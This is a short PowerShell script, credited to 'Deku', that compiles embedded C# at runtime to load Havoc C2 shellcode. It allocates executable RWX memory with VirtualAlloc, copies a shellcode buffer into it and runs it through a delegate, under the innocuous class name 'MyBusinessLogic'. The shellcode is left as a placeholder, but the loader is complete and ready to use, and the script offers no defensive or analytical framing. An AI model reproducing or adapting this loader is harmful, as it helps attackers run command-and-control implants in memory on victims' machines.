# Author:Deku
# This script executes Havoc C2 shellcode within C# using PowerShell

# Define the business logic for executing the shellcode (written in C#)
$MyBusinessLogic = @"
using System;
using System.Runtime.InteropServices;

public class MyBusinessLogic {
    // Havoc C2 shellcode buffer
    static byte[] my_buf = new byte[<PUT_YOUR_SHELLCODE_LENGTH_HERE>] {
        <PUT_YOUR_HAVOC_SHELLCODE_HERE - e.g. "0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,...">
    };

    // Import the VirtualAlloc function from kernel32.dll for memory allocation
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    // Define a delegate that will execute the shellcode
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void WindowRun();

    // Main function to execute the shellcode
    public static void Main() {
        // Allocate memory for the shellcode with RWX permissions
        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (uint)my_buf.Length, 0x1000, 0x40);

        // Copy the shellcode into the allocated memory
        Marshal.Copy(my_buf, 0x0, allocatedMemory, my_buf.Length);

        // Create a delegate to the allocated memory and execute it
        WindowRun runShellcode = (WindowRun)Marshal.GetDelegateForFunctionPointer(allocatedMemory, typeof(WindowRun));
        runShellcode();
    }
}
"@

# Compile the C# code at runtime using Add-Type and execute it
Add-Type $MyBusinessLogic

# Call the Main function to execute the shellcode
[MyBusinessLogic]::Main()
